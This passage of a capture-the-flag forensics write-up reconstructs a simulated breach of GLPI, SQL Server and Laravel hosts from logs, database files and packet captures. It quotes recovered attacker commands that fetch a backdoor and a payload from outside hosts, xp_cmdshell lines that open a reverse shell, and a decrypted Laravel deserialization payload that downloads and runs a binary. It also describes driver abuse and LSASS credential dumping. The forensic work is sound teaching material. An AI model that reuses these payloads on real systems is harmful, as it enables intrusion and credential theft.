+<span class="k">def</span> <span class="nf">unpad</span><span class="p">(</span><span class="n">s</span><span class="p">):</span>
+    <span class="k">return</span> <span class="n">s</span><span class="p">[:</span><span class="o">-</span><span class="n">s</span><span class="p">[</span><span class="o">-</span><span class="mi">1</span><span class="p">]]</span>
+
+<span class="n">ciphertexts</span> <span class="o">=</span> <span class="p">[</span><span class="n">x</span> <span class="k">for</span> <span class="n">x</span> <span class="ow">in</span> <span class="n">data</span><span class="p">.</span><span class="nf">split</span><span class="p">(</span><span class="sh">"</span><span class="s">;</span><span class="sh">"</span><span class="p">)</span> <span class="k">if</span> <span class="n">x</span><span class="p">.</span><span class="nf">strip</span><span class="p">()]</span>
+
+<span class="k">for</span> <span class="n">i</span><span class="p">,</span> <span class="n">ct</span> <span class="ow">in</span> <span class="nf">enumerate</span><span class="p">(</span><span class="n">ciphertexts</span><span class="p">,</span> <span class="mi">1</span><span class="p">):</span>
+    <span class="n">raw</span> <span class="o">=</span> <span class="n">base64</span><span class="p">.</span><span class="nf">b64decode</span><span class="p">(</span><span class="n">ct</span><span class="p">)</span>
+    <span class="n">cipher</span> <span class="o">=</span> <span class="n">AES</span><span class="p">.</span><span class="nf">new</span><span class="p">(</span><span class="n">key</span><span class="p">,</span> <span class="n">AES</span><span class="p">.</span><span class="n">MODE_CBC</span><span class="p">,</span> <span class="n">iv</span><span class="p">)</span>
+    <span class="n">decrypted</span> <span class="o">=</span> <span class="nf">unpad</span><span class="p">(</span><span class="n">cipher</span><span class="p">.</span><span class="nf">decrypt</span><span class="p">(</span><span class="n">raw</span><span class="p">))</span>
+    <span class="nf">print</span><span class="p">(</span><span class="sa">f</span><span class="sh">"</span><span class="s">[</span><span class="si">{</span><span class="n">i</span><span class="si">}</span><span class="s">] </span><span class="si">{</span><span class="n">decrypted</span><span class="p">.</span><span class="nf">decode</span><span class="p">(</span><span class="n">errors</span><span class="o">=</span><span class="sh">'</span><span class="s">ignore</span><span class="sh">'</span><span class="p">)</span><span class="si">}</span><span class="sh">"</span><span class="p">)</span>
+</code></pre></div></div>
+<p>decrypted command :</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">[</span>1]
+<span class="o">[</span>2] curl https://xthaz.fr/glpi_auth_backdoored.php <span class="o">&gt;</span> /var/www/glpi/src/Auth.php
+<span class="o">[</span>3] <span class="nb">whoami</span>
+</code></pre></div></div>
+<p>Jadi dari sini sudah kelihatan bagaimana bisa terjadi backdoor yaitu attacker melakukan overwriting pada Auth.php</p>
+
+<h3 id="absolute-path-of-file-used-to-backdoor-auth">Absolute Path of File Used to Backdoor Auth</h3>
+<p>The decrypted commands clearly show how the backdoor was deployed:</p>
+<ul>
+  <li>The attacker downloaded a malicious file from an external server</li>
+  <li>The file was written directly to: <code class="language-plaintext highlighter-rouge">/var/www/glpi/src/Auth.php</code></li>
+  <li>This action overwrote the authentication logic with a backdoored version</li>
+</ul>
+
+<p>So, the absolute path of file used to backdoor the authentication by the attacker was <code class="language-plaintext highlighter-rouge">/var/www/glpi/files/_tmp/setup.php</code></p>
+
+<h3 id="recovering-database">Recovering database</h3>
+<p>To further understand how the backdoor was registered, the glpi_plugins table needed to be analyzed.
+Since only a filesystem dump was provided, the database had to be recovered offline.</p>
+
+<p>The MariaDB version in use was identified from the mysql_upgrade_info file as 10.11.14-MariaDB.
+To ensure compatibility, a MariaDB container with a matching version was launched and the original data directory was mounted:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>docker run <span class="nt">-it</span> <span class="nt">--rm</span> <span class="se">\</span>
+  <span class="nt">-v</span> /home/user/dumps/GLPI01/var/lib/mysql:/var/lib/mysql <span class="se">\</span>
+  <span class="nt">-e</span> <span class="nv">MYSQL_ALLOW_EMPTY_PASSWORD</span><span class="o">=</span><span class="nb">yes</span> <span class="se">\</span>
+  mariadb:10.11 <span class="se">\</span>
+  <span class="nt">--skip-grant-tables</span> <span class="se">\</span>
+  <span class="nt">--innodb_force_recovery</span><span class="o">=</span>1
+</code></pre></div></div>
+<p>Once the database engine was running, the contents of the glpi_plugins table were queried.
+<img src="/assets/heroCTF/3c.png" alt="alt text" />
+<img src="/assets/heroCTF/3d.png" alt="alt text" />
+From the output, a Base64-encoded value was identified in the author field: <code class="language-plaintext highlighter-rouge">YUhlcm97VGhpc19HTFBJX2lzX2Z1bGx5X2JhY2tkb29yZWRfc2FwcmlzdGl9</code>. Decoding this value results in: : <code class="language-plaintext highlighter-rouge">aHero{This_GLPI_is_fully_backdoored_sapristi}</code></p>
+
+<p>At this stage of the investigation, this became one of the most confusing parts.
+Initially, inspecting the glpi_plugins.ibd file directly showed no readable content, which led to the assumption that the data might not have been written to disk yet or was lost.</p>
+
+<p>This caused a significant roadblock during the analysis, as the expected evidence seemed to be missing at the filesystem level.
+However, further investigation into MariaDB’s InnoDB storage behavior revealed that this assumption was incorrect.
+<img src="/assets/heroCTF/3b.png" alt="alt text" /></p>
+
+<p>This behavior is expected and does not indicate missing data. MariaDB’s InnoDB storage engine does not store table data in a human-readable format.
+Instead, it uses a page-based binary structure, which cannot be meaningfully interpreted using standard filesystem tools.
+InnoDB employs a Write-Ahead Logging (WAL) mechanism:</p>
+<ul>
+  <li>All data modifications are first recorded in the redo logs (ib_logfile0/1) to guarantee durability</li>
+  <li>Modified pages are kept in memory inside the buffer pool</li>
+  <li>These pages are later synchronized to the .ibd tablespace during background checkpoint operations</li>
+</ul>
+
+<p>This architecture explains why:</p>
+<ul>
+  <li>The .ibd file appears empty or unreadable when inspected directly</li>
+  <li>The data becomes fully visible once interpreted by the MariaDB engine</li>
+</ul>
+
+<p>This behavior is illustrated in the following diagram:
+<img src="/assets/heroCTF/3e.png" alt="alt text" />(Source: InnoDB Architecture – LinkedIn)</p>
+
+<p>To further validate that the data was indeed written during a committed transaction, the redo log was inspected:
+<img src="/assets/heroCTF/3f.png" alt="alt text" />
+The same Base64-encoded string was found within ib_logfile0, confirming that:</p>
+<ul>
+  <li>The plugin registration was executed</li>
+  <li>The transaction was logged and committed</li>
+  <li>The database state recovered via MariaDB is consistent and reliable</li>
+</ul>
+
+<p>From the recovered database, it is confirmed that the attacker registered the malicious plugin using the identifier:
+<code class="language-plaintext highlighter-rouge">This_GLPI_is_fully_backdoored_sapristi</code></p>
+
+<h3 id="id-of-the-cve-used">ID of the CVE used</h3>
+<p>Based on the vulnerability analysis of the exploited GLPI version, the attack aligns with an authenticated RCE vulnerability in GLPI, which was exploited by deploying a PHP webshell through the plugin mechanism.
+<img src="/assets/heroCTF/3i.png" alt="alt text" />
+src : https://github.com/glpi-project/glpi/security/advisories/GHSA-cwvp-j887-m4xh
+Answer : <code class="language-plaintext highlighter-rouge">CVE-2024-37149</code></p>
+
+<h3 id="samaccountname-used-to-exploit-the-application">sAMAccountName used to exploit the application</h3>
+<p><img src="/assets/heroCTF/3g.png" alt="alt text" />
+From the glpi_events table, it can be observed that the user neville.longbottom successfully logged into GLPI at:</p>
+<ul>
+  <li>Timestamp: 2025-11-22 23:03:48</li>
+  <li>Source IP: 192.168.56.200</li>
+</ul>
+
+<p><img src="/assets/heroCTF/3h.png" alt="alt text" />
+Additionally, Apache access logs show that the same IP address (192.168.56.200) initiated the malicious requests used to upload the webshell and interact with the compromised endpoints at 2025-11-22 23:03:49.
+The close temporal proximity between:</p>
+<ul>
+  <li>the successful login of neville.longbottom, and</li>
+  <li>the malicious HTTP requests originating from the same IP address
+confirms that the authenticated session of <code class="language-plaintext highlighter-rouge">neville.longbottom</code> was used to exploit the application.</li>
+</ul>
+
+<h3 id="ip-address-of-the-user-before-exploitation">IP Address of the user before exploitation</h3>
+<p>To identify the last legitimate IP address used by this account before exploitation, Event ID 4624 (Successful Logon) entries were filtered and sorted chronologically in ascending order.</p>
+
+<p>The following login sequence for neville.longbottom was identified:</p>
+<ul>
+  <li>192.168.56.230 — early legitimate login</li>
+  <li>192.168.56.101 — subsequent legitimate login</li>
+  <li>192.168.56.1 — excluded (out of scope as stated in the challenge)</li>
+  <li>192.168.56.200 — exploitation session
+Since:</li>
+</ul>
+
+<p>192.168.56.200 corresponds to the exploitation phase, and 192.168.56.1 is explicitly out of scope, so the last legitimate IP address used by neville.longbottom before exploitation is: <code class="language-plaintext highlighter-rouge">192.168.56.101</code></p>
+
+<p>FLAG: <code class="language-plaintext highlighter-rouge">Hero{/var/www/glpi/files/_tmp/setup.php;This_GLPI_is_fully_backdoored_sapristi;CVE-2024-37149;neville.longbottom;192.168.56.101}</code></p>
+
+<hr />
+
+<h2 id="operation-pensieve-breach---4">Operation Pensieve Breach - 4</h2>
+
+<h3 id="attachment-3">Attachment</h3>
+<ul>
+  <li>gringotts01-artifacts.7z</li>
+</ul>
+
+<h3 id="description-3">Description</h3>
+<p>As you’ve seen previously, the pensive (GLPI) got compromised. Neville got his account compromised too. Last time he logged on legitimately was on gringotts01.hogwarts.local (192.168.56.101). Investigate the server to find how his credentials were stolen. Please find the following information about how this was done:</p>
+<ul>
+  <li>Absolute path of the vulnerable binary.</li>
+  <li>Absolute path of the file containing Neville’s credentials.</li>
+  <li>Absolute path of the file used to exploit the vulnerable binary.</li>
+</ul>
+
+<p>The findings have to be separated by a “;”. Paths have to be in lowercase. <br />
+Here is an example flag format: <code class="language-plaintext highlighter-rouge">Hero{c:\path\file.ext;c:\path\file.ext;c:\path\file.ext}</code></p>
+
+<h3 id="analysis-byovd-attack">Analysis BYOVD Attack</h3>
+<p>At this stage, the investigation shifted to identifying how Neville’s credentials were compromised on the host <strong>gringotts01.hogwarts.local</strong>.</p>
+
+<p>The <code class="language-plaintext highlighter-rouge">$MFT</code> file was dumped into CSV format and filtered based on <strong>file creation time</strong> and <strong>file access time</strong> on <strong>22 November 2025</strong>. Since the exploitation timeline identified earlier occurred around <strong>23:13</strong>, the analysis focused on files accessed shortly before that time window.</p>
+<ul>
+  <li>upgrade.exe (d66d430293456d75384b267ad2027afa
+)</li>
+  <li>dbus.sys (c996d7971c49252c582171d9380360f2
+)</li>
+  <li>ntdll32.exe (c16c588eaf334f2cc658ee3aa36c1d8f)
+<img src="/assets/heroCTF/4.png" alt="alt text" /></li>
+</ul>
+
+<p>The hashes of these files were extracted and submitted to VirusTotal for further analysis.
+<img src="/assets/heroCTF/upgrade.png" alt="alt text" />
+<img src="/assets/heroCTF/dbus.png" alt="alt text" />
+<img src="/assets/heroCTF/ntdll32.png" alt="alt text" /></p>
+
+<h3 id="file-role-analysis">File role analysis</h3>
+<p><strong>1. dbus.sys – Vulnerable binary</strong>
+The file <code class="language-plaintext highlighter-rouge">dbus.sys</code> is identified as a version of the known vulnerable Dell driver <strong>DBUtil_2_3.sys</strong>, which is frequently abused in BYOVD attacks.<br />
+This driver exposes dangerous IOCTL handlers that allow arbitrary kernel-level memory read and write operations. As a result, it enables attackers to escalate privileges and bypass security controls.
+This file directly corresponds to:</p>
+<ul>
+  <li><strong>Absolute path of the vulnerable binary</strong><br />
+→ <code class="language-plaintext highlighter-rouge">c:\windows\syswow64\dbus.sys</code></li>
+</ul>
+
+<hr />
+
+<p><strong>2. upgrade.exe – Exploitation component</strong>
+The file <code class="language-plaintext highlighter-rouge">upgrade.exe</code> is detected as an exploitation tool associated with <strong>EDR SandBlast / BYOVD loaders</strong>.<br />
+Its role is to load the vulnerable driver (<code class="language-plaintext highlighter-rouge">dbus.sys</code>) into the kernel and abuse its exposed IOCTLs to gain kernel-level execution.</p>
+
+<p>This file is responsible for exploiting the vulnerable driver and therefore corresponds to:</p>
+<ul>
+  <li><strong>Absolute path of the file used to exploit the vulnerable binary</strong><br />
+→ <code class="language-plaintext highlighter-rouge">c:\windows\syswow64\upgrade.exe</code></li>
+</ul>
+
+<hr />
+
+<p><strong>3. ntdll32.exe – Credential dumping payload</strong></p>
+
+<p>The file <code class="language-plaintext highlighter-rouge">ntdll32.exe</code> is detected as an <strong>LSASS memory dumping tool</strong>.<br />
+Once kernel-level privileges are obtained via the BYOVD technique, this binary is used to dump the memory of the LSASS process, allowing the attacker to extract user credentials.</p>
+
+<p>This file contains Neville’s stolen credentials and corresponds to:</p>
+<ul>
+  <li><strong>Absolute path of the file containing Neville’s credentials</strong><br />
+→ <code class="language-plaintext highlighter-rouge">c:\windows\temp\ntdll32.exe</code></li>
+</ul>
+
+<p>FLAG: <code class="language-plaintext highlighter-rouge">Hero{c:\windows\syswow64\dbus.sys;c:\windows\temp\ntdll32.exe;c:\windows\syswow64\upgrade.exe}</code></p>
+
+<h2 id="operation-pensieve-breach---5">Operation Pensieve Breach - 5</h2>
+
+<h3 id="attachment-4">Attachment</h3>
+<ul>
+  <li>gringotts01-sqllogs.7z</li>
+  <li>gringotts01_winevt.7z</li>
+  <li>gringotts02_winevt.7z</li>
+</ul>
+
+<h3 id="description-4">Description</h3>
+<p>You understand how the attacker might have retrieved Neville’s credentials. But how did the attacker gain administrative access over gringotts01.hogwarts.local ? Find the following information:</p>
+<ul>
+  <li>Account used to download and execute payloads.</li>
+  <li>NETBIOS name of the machine from which the requests are issued.</li>
+  <li>URL used to host the reverse shell executable.</li>
+  <li>Port used by the attacker for his reverse shell.</li>
+  <li>Internal IP address from which SQL queries are actually issued.</li>
+</ul>
+
+<p>The findings have to be separated by a “;”. <br />
+Here is an example flag format: <code class="language-plaintext highlighter-rouge">Hero{account;MACHINE23;ftp://attacker.com:21/file.ext;445;127.0.0.1}</code></p>
+
+<h3 id="xel-recovery-and-sql-activity-analysis">XEL Recovery and SQL Activity Analysis</h3>
+<p>At this stage, the first step was to recover and analyze the .xel file. An XEL file is a binary log format used by Microsoft SQL Server Extended Events to store detailed execution traces such as queries, authentication context, and client metadata.</p>
+
+<p>To parse the XEL file, a running SQL Server instance is required.
+I initially faced uncertainty regarding the SQL Server version used on the target system. While SQL Server 2025 exists, its release date is very close to the competition timeline, making it unlikely to be used in this scenario. Therefore, SQL Server 2022 was selected as a reasonable and realistic version.</p>
+
+<p>It is also important to note that the default administrative account for SQL Server is sa, which is commonly abused in post-exploitation scenarios.</p>
+
+<p>The SQL Server instance was deployed using Docker as follows:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>docker run <span class="nt">-d</span> <span class="nt">--name</span> sql <span class="se">\</span>
+  <span class="nt">-e</span> <span class="s2">"ACCEPT_EULA=Y"</span> <span class="se">\</span>
+  <span class="nt">-e</span> <span class="s2">"SA_PASSWORD=Pensieve"</span> <span class="se">\</span>
+  <span class="nt">-p</span> 1433:1433 <span class="se">\</span>
+  mcr.microsoft.com/mssql/server:2022-latest
+</code></pre></div></div>
+<p>After the database was running, the XEL file was copied into the container:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>docker <span class="nb">cp </span>sqllogs_0_134083199634230000_2.xel sql:/tmp/trace.xel
+</code></pre></div></div>
+<p>The database was then accessed using SQL Server Management Studio (SSMS). To extract readable data from the XEL file, the following SQL query was used. This query converts the binary XEL data into XML and exposes relevant fields such as timestamps, usernames, client hostnames, and executed SQL statements.</p>
+<div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">SET</span> <span class="n">QUOTED_IDENTIFIER</span> <span class="k">ON</span><span class="p">;</span>
+<span class="k">GO</span>
+
+<span class="n">IF</span> <span class="n">OBJECT_ID</span><span class="p">(</span><span class="s1">'dbo.XEL_Trace'</span><span class="p">)</span> <span class="k">IS</span> <span class="k">NOT</span> <span class="k">NULL</span>
+    <span class="k">DROP</span> <span class="k">VIEW</span> <span class="n">dbo</span><span class="p">.</span><span class="n">XEL_Trace</span><span class="p">;</span>
+<span class="k">GO</span>
+
+<span class="k">CREATE</span> <span class="k">VIEW</span> <span class="n">dbo</span><span class="p">.</span><span class="n">XEL_Trace</span> <span class="k">AS</span>
+<span class="k">WITH</span> <span class="n">xe</span> <span class="k">AS</span> <span class="p">(</span>
+    <span class="k">SELECT</span> <span class="k">CAST</span><span class="p">(</span><span class="n">event_data</span> <span class="k">AS</span> <span class="n">XML</span><span class="p">)</span> <span class="k">AS</span> <span class="n">event_xml</span>
+    <span class="k">FROM</span> <span class="n">sys</span><span class="p">.</span><span class="n">fn_xe_file_target_read_file</span><span class="p">(</span>
+        <span class="s1">'/tmp/trace.xel'</span><span class="p">,</span>
+        <span class="k">NULL</span><span class="p">,</span> <span class="k">NULL</span><span class="p">,</span> <span class="k">NULL</span>
+    <span class="p">)</span>
+<span class="p">)</span>
+<span class="k">SELECT</span>
+    <span class="n">xe</span><span class="p">.</span><span class="n">event_xml</span><span class="p">.</span><span class="n">value</span><span class="p">(</span><span class="s1">'(event/@timestamp)[1]'</span><span class="p">,</span> <span class="s1">'datetime2'</span><span class="p">)</span>                                <span class="k">AS</span> <span class="p">[</span><span class="nb">timestamp</span><span class="p">],</span>
+    <span class="n">xe</span><span class="p">.</span><span class="n">event_xml</span><span class="p">.</span><span class="n">value</span><span class="p">(</span><span class="s1">'(event/action[@name="username"]/value)[1]'</span><span class="p">,</span> <span class="s1">'nvarchar(256)'</span><span class="p">)</span>        <span class="k">AS</span> <span class="p">[</span><span class="n">username</span><span class="p">],</span>
+    <span class="n">xe</span><span class="p">.</span><span class="n">event_xml</span><span class="p">.</span><span class="n">value</span><span class="p">(</span><span class="s1">'(event/action[@name="client_hostname"]/value)[1]'</span><span class="p">,</span> <span class="s1">'nvarchar(256)'</span><span class="p">)</span> <span class="k">AS</span> <span class="p">[</span><span class="n">client_hostname</span><span class="p">],</span>
+    <span class="n">xe</span><span class="p">.</span><span class="n">event_xml</span><span class="p">.</span><span class="n">value</span><span class="p">(</span><span class="s1">'(event/data[@name="batch_text"]/value)[1]'</span><span class="p">,</span> <span class="s1">'nvarchar(max)'</span><span class="p">)</span>        <span class="k">AS</span> <span class="p">[</span><span class="n">batch_text</span><span class="p">],</span>
+    <span class="n">xe</span><span class="p">.</span><span class="n">event_xml</span><span class="p">.</span><span class="n">value</span><span class="p">(</span><span class="s1">'(event/data[@name="statement"]/value)[1]'</span><span class="p">,</span> <span class="s1">'nvarchar(max)'</span><span class="p">)</span>         <span class="k">AS</span> <span class="p">[</span><span class="k">statement</span><span class="p">],</span>
+    <span class="n">xe</span><span class="p">.</span><span class="n">event_xml</span><span class="p">.</span><span class="n">value</span><span class="p">(</span><span class="s1">'(event/@name)[1]'</span><span class="p">,</span> <span class="s1">'nvarchar(100)'</span><span class="p">)</span>                                  <span class="k">AS</span> <span class="n">event_name</span>
+<span class="k">FROM</span> <span class="n">xe</span><span class="p">;</span>
+<span class="k">GO</span>
+</code></pre></div></div>
+<p>All extracted events were then displayed and ordered chronologically:</p>
+<div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">SELECT</span> <span class="o">*</span>
+<span class="k">FROM</span> <span class="n">dbo</span><span class="p">.</span><span class="n">XEL_Trace</span>
+<span class="k">ORDER</span> <span class="k">BY</span> <span class="p">[</span><span class="nb">timestamp</span><span class="p">];</span>
+</code></pre></div></div>
+<p><img src="/assets/heroCTF/5c.png" alt="alt text" />
+<img src="/assets/heroCTF/5a.png" alt="alt text" />
+<img src="/assets/heroCTF/5.png" alt="alt text" />
+<img src="/assets/heroCTF/5b.png" alt="alt text" />
+From the recovered XEL data, the credential-theft activity targeting Neville can be reconstructed. At 2025-11-22 22:34:22, the attacker executed the following query:</p>
+<div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">exec</span> <span class="n">master</span><span class="p">.</span><span class="n">dbo</span><span class="p">.</span><span class="n">sp_configure</span> <span class="s1">'show advanced options'</span><span class="p">,</span><span class="mi">1</span><span class="p">;</span><span class="n">RECONFIGURE</span><span class="p">;</span><span class="k">exec</span> <span class="n">master</span><span class="p">.</span><span class="n">dbo</span><span class="p">.</span><span class="n">sp_configure</span> <span class="s1">'xp_cmdshell'</span><span class="p">,</span> <span class="mi">1</span><span class="p">;</span><span class="n">RECONFIGURE</span><span class="p">;</span>
+</code></pre></div></div>
+<p>This explicitly enables <code class="language-plaintext highlighter-rouge">xp_cmdshell</code>, a dangerous SQL Server feature that allows direct execution of operating system commands from SQL queries. This step clearly marks the transition from database access to full system-level exploitation.</p>
+
+<p>At 2025-11-22 22:50:21, the attacker executed:</p>
+<div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">exec</span> <span class="n">master</span><span class="p">..</span><span class="n">xp_cmdshell</span> <span class="s1">'curl -o "C:</span><span class="se">\t</span><span class="s1">ools</span><span class="se">\u</span><span class="s1">pdate1.exe" http://192.168.56.200:8000/update.exe'</span>
+</code></pre></div></div>
+<p>This command downloads a malicious executable (update1.exe) from the attacker-controlled host 192.168.56.200 over HTTP.</p>
+
+<p>At 2025-11-22 22:59:49, the attacker executed the following queries:</p>
+<div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">SELECT</span> <span class="o">*</span> <span class="k">FROM</span> <span class="n">sys</span><span class="p">.</span><span class="n">dm_os_file_exists</span><span class="p">(</span><span class="s1">'C:</span><span class="se">\W</span><span class="s1">indows</span><span class="se">\T</span><span class="s1">emp</span><span class="se">\n</span><span class="s1">tdll32.exe'</span><span class="p">)</span>
+<span class="k">SELECT</span> <span class="o">*</span> <span class="k">FROM</span> <span class="n">OPENROWSET</span><span class="p">(</span><span class="n">BULK</span> <span class="n">N</span><span class="s1">'C:</span><span class="se">\W</span><span class="s1">indows</span><span class="se">\T</span><span class="s1">emp</span><span class="se">\n</span><span class="s1">tdll32.exe'</span><span class="p">,</span> <span class="n">SINGLE_BLOB</span><span class="p">)</span> <span class="k">AS</span> <span class="n">HexContent</span>
+</code></pre></div></div>
+<p>These queries were used to:</p>
+<ul>
+  <li>Verify the presence of ntdll32.exe on disk</li>
+  <li>Read the full binary content directly through SQL Server</li>
+</ul>
+
+<p>This confirms abuse of database privileges to access and stage a credential-dumping tool, strongly indicating LSASS dumping activity.</p>
+
+<p>Finally, at 2025-11-23 19:06:49, the attacker executed:</p>
+<div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">exec</span> <span class="n">master</span><span class="p">..</span><span class="n">xp_cmdshell</span> <span class="s1">'cmd /c "C:</span><span class="se">\t</span><span class="s1">ools</span><span class="se">\u</span><span class="s1">pdate1.exe --revshell 51.75.120.170 445"'</span>
+</code></pre></div></div>
+<p>This command establishes a reverse shell to the attacker’s C2 server (51.75.120.170:445), enabling interactive command execution on the compromised host.</p>
+
+<h3 id="account-used-to-download-and-execute-payloads">Account used to download and execute payloads.</h3>
+<p>All malicious SQL queries were executed using the <code class="language-plaintext highlighter-rouge">sa</code> account, confirming full administrative compromise of the SQL Server.</p>
+
+<h3 id="netbios-name-of-the-machine-from-which-the-requests-are-issued">NETBIOS name of the machine from which the requests are issued.</h3>
+<p>Based on the client_hostname field in the XEL logs, the NETBIOS name of the machine issuing the SQL queries is: <code class="language-plaintext highlighter-rouge">GRINGOTTS02</code></p>
+
+<h3 id="url-used-to-host-the-reverse-shell-executable">URL used to host the reverse shell executable</h3>
+<p>The malicious payload was downloaded from: <code class="language-plaintext highlighter-rouge">http://192.168.56.200:8000/update.exe</code></p>
+
+<h3 id="port-used-by-the-attacker-for-his-reverse-shell">Port used by the attacker for his reverse shell</h3>
+<p>The reverse shell connects back to the attacker on port 445, a port commonly abused due to its association with SMB traffic and frequent allowance through firewalls.</p>
+
+<h3 id="internal-ip-address-from-which-sql-queries-are-actually-issued">Internal IP address from which SQL queries are actually issued</h3>
+<p>The internal IP address issuing the SQL queries is: <code class="language-plaintext highlighter-rouge">192.168.56.200</code>
+This conclusion is drawn from the fact that:</p>
+<ul>
+  <li>The SQL queries originated from the same host serving the malicious executable</li>
+  <li>Usually, payload hosting is typically performed from the attacker’s own machine</li>
+</ul>
+
+<p>FLAG: <code class="language-plaintext highlighter-rouge">Hero{sa;GRINGOTTS02;http://192.168.56.200:8000/update.exe;445;192.168.56.200}</code></p>
+
+<h2 id="operation-pensieve-breach---6">Operation Pensieve Breach - 6</h2>
+
+<h3 id="attachment-5">Attachment</h3>
+<ul>
+  <li>spellbook_network_capture.pcap</li>
+  <li>spellbook_var.7z</li>
+</ul>
+
+<h3 id="description-5">Description</h3>
+<p>You almost found everything that happened during that case. Throughout the investigation you noticed connections originating from the web server spellbook.hogwarts.local. Since malicious files were downloaded from this server that is ours, investigate to find what happened. Please find the following information about how the attacker compromised the server:</p>
+<ul>
+  <li>Secret used by the attacker to exploit the application.</li>
+  <li>Absolute path of the binary used for post-exploitation. <br />
+The findings have to be separated by a “;”.
+Here is an example flag format: <code class="language-plaintext highlighter-rouge">Hero{TheSecret;/bin/bash}</code></li>
+</ul>
+
+<h3 id="analysis-how-the-attacker-compromised-the-server">Analysis how the attacker compromised the server</h3>
+<p>The primary vulnerability in this web application is the exposure of the Laravel <code class="language-plaintext highlighter-rouge">APP_KEY</code> inside the <code class="language-plaintext highlighter-rouge">.env</code> file:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>APP_KEY=base64:zHJvDAIBtVN83kzkjqUZNv42w9gjd8FZZllqdqn0EBQ=
+</code></pre></div></div>
+<p>While researching the impact of a leaked APP_KEY, I found a relevant blog post explaining how this vulnerability can lead to Remote Code Execution (RCE) through crafted cookies https://blog.gitguardian.com/exploiting-public-app_key-leaks/. This technique abuses Laravel’s insecure deserialization when attacker-controlled encrypted cookies are processed by the application.</p>
+
+<h3 id="network-traffic-analysis">Network Traffic Analysis</h3>
+<p>To confirm exploitation, I analyzed the HTTP traffic inside the provided PCAP file.
+During this analysis, I identified a HTTP frame that was anomalous compared to normal requests:</p>
+<ul>
+  <li>The requests consisted only of HTTP headers</li>
+  <li>The packet sizes differed significantly from regular GET requests</li>
+</ul>
+
+<p><img src="/assets/heroCTF/6.png" alt="alt text" />
+<img src="/assets/heroCTF/6a.png" alt="alt text" />
+The frame contained multiple cookies, but one cookie stood out due to its unusually large size and encoded structure:<code class="language-plaintext highlighter-rouge">dwULUYdxyze7n8i8qU5UKE8WnVHoa4mIrYwjwcWo=</code>. This strongly indicated an encrypted Laravel cookie carrying serialized data. To analyze the suspicious cookie, I used  <a href="https://github.com/synacktiv/laravel-crypto-killer">laravel_crypto_killer</a>, a tool designed to decrypt Laravel cookies when the APP_KEY is known.</p>
+
+<p>After decrypting the cookie, the following payload was recovered:
+<img src="/assets/heroCTF/6b.png" alt="alt text" /></p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>5d4711437c28116d0c311af63207e19023b453c8|5d4711437c28116d0c311af63207e19023b453c8|<span class="o">{</span><span class="s2">"data"</span>:<span class="s2">"O:40:</span><span class="se">\"</span><span class="s2">Illuminate</span><span class="se">\\</span><span class="s2">Broadcasting</span><span class="se">\\</span><span class="s2">PendingBroadcast</span><span class="se">\"</span><span class="s2">:1:{s:9:</span><span class="se">\"\u</span><span class="s2">0000*</span><span class="se">\u</span><span class="s2">0000events</span><span class="se">\"</span><span class="s2">;O:29:</span><span class="se">\"</span><span class="s2">Illuminate</span><span class="se">\\</span><span class="s2">Queue</span><span class="se">\\</span><span class="s2">QueueManager</span><span class="se">\"</span><span class="s2">:2:{s:6:</span><span class="se">\"\u</span><span class="s2">0000*</span><span class="se">\u</span><span class="s2">0000app</span><span class="se">\"</span><span class="s2">;a:1:{s:6:</span><span class="se">\"</span><span class="s2">config</span><span class="se">\"</span><span class="s2">;a:2:{s:13:</span><span class="se">\"</span><span class="s2">queue.default</span><span class="se">\"</span><span class="s2">;s:3:</span><span class="se">\"</span><span class="s2">key</span><span class="se">\"</span><span class="s2">;s:21:</span><span class="se">\"</span><span class="s2">queue.connections.key</span><span class="se">\"</span><span class="s2">;a:1:{s:6:</span><span class="se">\"</span><span class="s2">driver</span><span class="se">\"</span><span class="s2">;s:4:</span><span class="se">\"</span><span class="s2">func</span><span class="se">\"</span><span class="s2">;}}}s:13:</span><span class="se">\"\u</span><span class="s2">0000*</span><span class="se">\u</span><span class="s2">0000connectors</span><span class="se">\"</span><span class="s2">;a:1:{s:4:</span><span class="se">\"</span><span class="s2">func</span><span class="se">\"</span><span class="s2">;a:2:{i:0;O:28:</span><span class="se">\"</span><span class="s2">Illuminate</span><span class="se">\\</span><span class="s2">Auth</span><span class="se">\\</span><span class="s2">RequestGuard</span><span class="se">\"</span><span class="s2">:3:{s:11:</span><span class="se">\"\u</span><span class="s2">0000*</span><span class="se">\u</span><span class="s2">0000callback</span><span class="se">\"</span><span class="s2">;s:14:</span><span class="se">\"</span><span class="s2">call_user_func</span><span class="se">\"</span><span class="s2">;s:10:</span><span class="se">\"\u</span><span class="s2">0000*</span><span class="se">\u</span><span class="s2">0000request</span><span class="se">\"</span><span class="s2">;s:6:</span><span class="se">\"</span><span class="s2">system</span><span class="se">\"</span><span class="s2">;s:11:</span><span class="se">\"\u</span><span class="s2">0000*</span><span class="se">\u</span><span class="s2">0000provider</span><span class="se">\"</span><span class="s2">;s:102:</span><span class="se">\"</span><span class="s2">curl -k https://xthaz.fr/kinit -o /dev/shm/kinit &amp;&amp; chmod +x /dev/shm/kinit &amp;&amp; /dev/shm/kinit &amp; disown</span><span class="se">\"</span><span class="s2">;}i:1;s:4:</span><span class="se">\"</span><span class="s2">user</span><span class="se">\"</span><span class="s2">;}}}}"</span>,<span class="s2">"expires"</span>:9999999999<span class="o">}</span>
+</code></pre></div></div>
+<p>From the decrypted payload, the embedded command is clearly visible:</p>
